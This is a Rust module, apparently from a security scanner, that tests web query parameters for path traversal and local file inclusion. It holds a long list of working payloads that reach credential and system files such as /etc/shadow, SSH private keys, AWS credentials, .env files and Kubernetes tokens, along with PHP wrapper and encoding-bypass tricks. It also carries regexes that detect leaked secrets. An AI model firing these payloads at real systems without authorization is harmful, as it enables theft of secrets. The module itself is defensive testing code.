//! Path Traversal detection.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..;/etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "../etc/shadow",
    "../../../windows/win.ini",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/crontab",
    "/etc/group",
    "/etc/resolv.conf",
    "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa",
    "/root/.aws/credentials",
    "/home/ubuntu/.aws/credentials",
    "/var/www/html/.env",
    "/app/.env",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/proc/version",
    "/proc/net/tcp",
    "/proc/net/fib_trie",
    "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf",
    "/etc/mysql/my.cnf",
    "/etc/kubernetes/kubelet.conf",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/tmp/.dockerenv",
    "/var/lib/mysql/auto.cnf",
    "..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\windows\\system32\\config\\SAM",
    "C:\\windows\\win.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\boot.ini",
    "C:\\windows\\system32\\config\\repair\\SAM",
    "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
    "..\\boot.ini",
    "..\\..\\..\\..\\..\\etc\\passwd",
    "..\\..\\..\\..\\..\\etc\\shadow",
    "..\\..\\..\\..\\..\\etc\\hosts",
    "..\\..\\..\\..\\..\\etc\\hostname",
    "..\\..\\..\\..\\..\\proc\\self\\environ",
    "..\\..\\..\\..\\..\\etc\\nginx\\nginx.conf",
    "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\../etc/passwd",
    "%2e%2e%2fetc%2fshadow",
    "%2e%2e%2fetc%2fhosts",
    "%2e%2e%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%252e%252e%252fetc%252fshadow",
    "%252e%252e%252fetc%252fhosts",
    "%252e%252e%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%5cwindows%5cwin.ini",
    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "%252e%252e%255cwindows%255cwin.ini",
    "%c0%af%2e%2e%2fetc%2fpasswd",
    "%c0%ae%c0%ae%c0%afetc%2fpasswd",
    "%c1%9cwindows%c1%9cwin.ini",
    "%c1%9c%2e%2e%c1%9c%2e%2e%c1%9cwindows%c1%9cwin.ini",
    "%e0%80%ae%e0%80%ae%c0%afetc%2fpasswd",
    "..%c0%afetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%u002e%u002e%u2215etc%u2215passwd",
    "%u002e%u002e%u2216etc%u2216passwd",
    "%uFF0E%uFF0E%u2215etc%u2215passwd",
    "..%u2215etc%u2215passwd",
    "..%u2216etc%u2216passwd",
    "..\u{2215}etc\u{2215}passwd",
    "..\u{2044}etc\u{2044}passwd",
    "..\u{2216}etc\u{2216}passwd",
    "..\u{ff0f}etc\u{ff0f}passwd",
    "..\u{29f8}etc\u{29f8}passwd",
    "..\u{ff3c}etc\u{ff3c}passwd",
    "..\u{a0}etc\u{a0}passwd",
    "../etc/passwd%00",
    "..%00/etc/passwd",
    "..%00/",
    ".../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..;/etc/passwd%00",
    "../;../etc/passwd",
    ".\\;/etc/passwd",
    "..%3b/etc/passwd",
    "..%3b..%3b..%3betc%3bpasswd",
    "..%252f..%252fetc%252fpasswd%2500",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/zlib.inflate/resource=/etc/passwd",
    "php://input",
    "expect://id",
    "data://text/plain,<?php phpinfo();?>",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "zip://../../../../etc/passwd%23",
    "phar://../../uploads/shell.phar",
    "file:///etc/shadow",
    "file:///C:/windows/win.ini",
    "file://C:/windows/system32/drivers/etc/hosts",
    "file://localhost/etc/passwd",
    "file:///proc/self/environ",
    "file:///proc/self/status",
    "file:///C:/boot.ini",
    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0",
    "dict://127.0.0.1:11211/version",
    "../../../../../../var/log/apache2/access.log",
    "../../../../../../var/log/apache/access.log",
    "../../../../../../var/log/nginx/access.log",
    "../../../../../../var/log/auth.log",
    "../../../../../../var/log/messages",
    "../../../../../../var/log/syslog",
    "../../../../../../proc/self/fd/2",
    "../../../../../../proc/self/fd/1",
    "../../../../../../proc/self/fd/0",
    "../../../../../../tmp/.dockerenv",
];

const LFI_INDICATORS: &[&str] = &[
    r"root:.*:0:0:",
    r"daemon:.*:1:1:",
    r"bin:.*:2:2:",
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[mail\]",
    r"\[compatibility\]",
    r"for 16-bit app support",
    r"(?m)^[a-z0-9_-]+:\*:\d+:\d+:",
    r"(?i)-----begin",
    r"(?i)private-key",
    r"(?i)ssh-rsa ",
    r"(?i)AKIA[0-9A-Z]{16}",
    r"(?i)aws_access_key_id",
    r"(?i)secret_access_key",
    r"(?i)database_url=",
    r"(?i)db_password=",
    r"(?i)mysql_password",
    r"(?i)pgpassword",
    r"(?i)redis_url",
    r"\[Desktop\]",
    r"\[Metrics\]",
    r"(?i)www-data",
    r"(?i)nobody:",
    r"(?i)kubelet",
    r"(?i)kubernetes.io/serviceaccount",
    r"(?i)dockerenv",
    r"(?i)listen 80",
    r"(?i)server_name",
    r"(?i)DocumentRoot",
    r"(?i)LoadModule",
    r"(?i)user = mysql",
    r"(?i)datadir",
    r"(?i)Port 22",
    r"(?i)PermitRootLogin",
    r"(?i)\[client\]",
    r"(?i)local-infile",
    r"(?i)php_value",
    r"(?i)\[\[Unicode\]\]",
];

pub async fn check_path_traversal(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let file_params = [
        "file",
        "path",
        "doc",
        "document",
        "page",
        "root",
        "load",
        "read",
        "dir",
        "show",
        "include",
        "require",
        "template",
        "view",
        "folder",
        "location",
        "f",
        "filename",
        "filepath",
        "name",
        "src",
        "href",
        "download",
        "img",
        "image",
        "avatar",
        "icon",
        "logo",
        "attachment",
        "upload",
        "media",
        "theme",
        "style",
        "css",
        "js",
        "script",
        "module",
        "config",
        "conf",
        "ini",
        "php",
        "asp",
        "aspx",
        "jsp",
        "env",
        "dotenv",
        "plugin",
        "theme_dir",
        "base",
        "dir_path",
        "folder_path",
        "realpath",
        "fullpath",
    ];

    let base_query: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _value) in &base_query {
        if !file_params.contains(&param_name.as_str()) {
            continue;
        }

        for payload in PATH_TRAVERSAL_PAYLOADS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &base_query {
                    let val = if k == param_name {
                        payload.to_string()
                    } else {
                        v.clone()
                    };
                    pairs.append_pair(k, &val);
                }
            }

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
            {
                for indicator in LFI_INDICATORS {
                    if let Ok(re) = Regex::new(indicator)
                        && re.is_match(&response.body)
                    {
                        let mut finding = Finding::new(
                            format!(
                                "Path Traversal / LFI detected in parameter '{}'",
                                param_name
                            ),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::Critical,
                            Confidence::Confirmed,
                            "grym-web-scanner",
                        );
                        finding.categories.push("A05:2025-Injection".into());
                        finding.cwe_ids.push(22);
                        finding.evidence.push(Evidence::redacted(
                            "path-traversal",
                            format!("Payload: {}, Indicator: {}", payload, indicator),
                            response.body.chars().take(200).collect::<String>(),
                        ));
                        finding.remediation = "Validate file paths against an allowlist. Use a chroot jail or sandbox for file operations.".into();
                        finding
                            .references
                            .push("https://owasp.org/www-community/attacks/Path_Traversal".into());
                        findings.push(finding);
                        break;
                    }
                }
            }
        }
    }

    Ok(findings)
}
